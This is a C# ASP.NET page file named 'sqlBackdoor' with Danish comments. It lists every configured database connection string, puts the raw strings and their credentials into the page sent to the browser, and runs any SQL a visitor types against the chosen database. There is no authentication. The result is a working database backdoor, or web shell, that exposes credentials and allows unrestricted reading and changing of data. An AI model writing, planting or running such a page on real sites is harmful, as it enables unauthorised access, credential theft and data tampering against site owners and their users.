using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data.Sql;
using System.Data.SqlClient;

public partial class sqlBackdoor_Default : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            // alle sql connection strings
            System.Configuration.ConnectionStringSettingsCollection connStrings = System.Web.Configuration.WebConfigurationManager.ConnectionStrings;

            // TODO kan man bare bruge en datasource, og databind'e?
            //DropDownListConnectionStrings.DataSource = connStrings;

            if (connStrings != null)
            {
                DropDownListConnectionStrings.Items.Clear();
                foreach (System.Configuration.ConnectionStringSettings cs in connStrings)
                {
                    // TODO find console vinduet
                    Console.WriteLine(cs.Name);
                    Console.WriteLine(cs.ProviderName);
                    Console.WriteLine(cs.ConnectionString);
                    DropDownListConnectionStrings.Items.Add(new ListItem(cs.Name, cs.ConnectionString));
                }
            }
        }
    }


    protected void ButtonExecuteQuery_Click(object sender, EventArgs e)
    { 
        SqlConnection conn = new SqlConnection();
        try
        {
            // TODO manuel sql connection

            conn.ConnectionString = DropDownListConnectionStrings.SelectedValue.ToString();
            conn.Open();

            // TODO command
            SqlCommand cmd = new SqlCommand(TextBoxSQL.Text, conn);
            cmd.CommandType = System.Data.CommandType.Text;

            // TODO execute
            SqlDataReader reader = cmd.ExecuteReader(System.Data.CommandBehavior.Default);
        
            // TODO respons
            LabelResponse.Text = "";
            if (reader.RecordsAffected > 0)
            {
                LabelResponse.Text += "Kommandoen har ændret " + reader.RecordsAffected + " post(er) i databasen.<br>\n";
            }

            if (!reader.IsClosed && reader.HasRows)
            {
                GridViewResult.DataSource = reader;
                GridViewResult.DataBind();

                LabelResponse.Text += "Kommandoen returner " + GridViewResult.Rows.Count + " post(er) fra databasen.<br>\n";
            
            }
            else
            {
                GridViewResult.DataSource = null;
                GridViewResult.DataBind();
            }
        }
        catch (System.Data.SqlClient.SqlException SqlE)
        {
            // display error
            LabelResponse.Text = SqlE.Message;
            if (SqlE.LineNumber > -1  && SqlE.LineNumber < 65536)
            {
                LabelResponse.Text += " Se line " + SqlE.LineNumber;
            }

            // flush result
            GridViewResult.DataSource = null;
            GridViewResult.DataBind();
        }
        finally
        {
            conn.Close();
        }

    }
}